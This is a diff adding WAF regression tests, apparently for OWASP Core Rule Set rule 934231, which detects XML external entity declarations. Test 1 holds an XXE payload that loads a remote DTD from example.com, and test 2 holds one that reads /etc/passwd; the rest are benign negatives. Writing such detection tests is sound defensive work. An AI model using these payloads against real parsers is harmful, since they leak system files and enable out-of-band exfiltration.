@@ -1,0 +1,96 @@
+---
+meta:
+  author: "adilalperenciftci"
+  description: XML external entity declaration (PL2)
+rule_id: 934231
+tests:
+  - test_id: 1
+    desc: 'Out-of-band XXE, parameter entity over http'
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Host: localhost
+            User-Agent: "OWASP CRS test agent"
+            Accept: "*/*"
+            Content-Type: text/plain
+          method: POST
+          port: 80
+          uri: "/post"
+          version: HTTP/1.1
+          data: '<!DOCTYPE r [<!ENTITY % p SYSTEM "http://example.com/e.dtd"> %p;]><r/>'
+        output:
+          log:
+            expect_ids: [934231]
+  - test_id: 2
+    desc: 'Classic XXE, file scheme'
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Host: localhost
+            User-Agent: "OWASP CRS test agent"
+            Accept: "*/*"
+            Content-Type: text/plain
+          method: POST
+          port: 80
+          uri: "/post"
+          version: HTTP/1.1
+          data: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>hello&x;</r>'
+        output:
+          log:
+            expect_ids: [934231]
+  - test_id: 3
+    desc: 'PUBLIC external entity'
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Host: localhost
+            User-Agent: "OWASP CRS test agent"
+            Accept: "*/*"
+            Content-Type: text/plain
+          method: POST
+          port: 80
+          uri: "/post"
+          version: HTTP/1.1
+          data: '<!DOCTYPE r [<!ENTITY % HTMLlat1 PUBLIC "-//W3C//ENTITIES Latin 1 for XHTML//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml-lat1.ent"> %HTMLlat1;]><r/>'
+        output:
+          log:
+            expect_ids: [934231]
+  - test_id: 4
+    desc: 'Negative: internal entity only'
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Host: localhost
+            User-Agent: "OWASP CRS test agent"
+            Accept: "*/*"
+            Content-Type: text/plain
+          method: POST
+          port: 80
+          uri: "/post"
+          version: HTTP/1.1
+          data: '<!DOCTYPE r [<!ENTITY greet "hello">]><r>&greet;</r>'
+        output:
+          log:
+            no_expect_ids: [934231]
+  - test_id: 5
+    desc: 'Negative: no DTD'
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Host: localhost
+            User-Agent: "OWASP CRS test agent"
+            Accept: "*/*"
+            Content-Type: text/plain
+          method: POST
+          port: 80
+          uri: "/post"
+          version: HTTP/1.1
+          data: '<?xml version="1.0"?><r system="a">SYSTEM "b"</r>'
+        output:
+          log:
+            no_expect_ids: [934231]
